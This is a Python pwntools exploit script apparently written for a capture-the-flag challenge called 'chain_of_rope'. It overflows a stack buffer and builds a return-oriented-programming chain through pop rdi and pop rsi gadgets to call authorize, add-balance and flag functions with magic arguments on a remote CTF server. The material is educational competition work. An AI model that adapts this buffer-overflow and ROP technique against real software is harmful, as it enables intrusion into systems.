#!/usr/bin/env python

from pwn import *

NUM_JUNK_BYTES = 0x38

# function addresses
AUTHORIZE_ADDR      = 0x00401196
ADD_BALANCE_ADDR    = 0x004011ab
FLAG_ADDR           = 0x004011eb

# ROP gadgets
POP_RDI_GADGET = 0x00401403   # pop rdi ; ret
POP_RSI_GADGET = 0x00401401   # pop rsi ; pop r15 ; ret

def recv_response(p):
    r = p.recv()
    print "[+] Response: " + r
    return r

p = remote("shell.actf.co", 19400)
#p = process('./chain_of_rope')

recv_response(p)

# gdb.attach(p)

p.sendline('1')

buf = "a" * NUM_JUNK_BYTES
buf += p64(AUTHORIZE_ADDR)
buf += p64(POP_RDI_GADGET)
buf += p64(0xdeadbeef)
buf += p64(ADD_BALANCE_ADDR)
buf += p64(POP_RDI_GADGET)
buf += p64(0xba5eba11)
buf += p64(POP_RSI_GADGET)
buf += p64(0xbedabb1e)
buf += "b" * 8
buf += p64(FLAG_ADDR)

p.sendline(buf)

recv_response(p)

p.interactive()
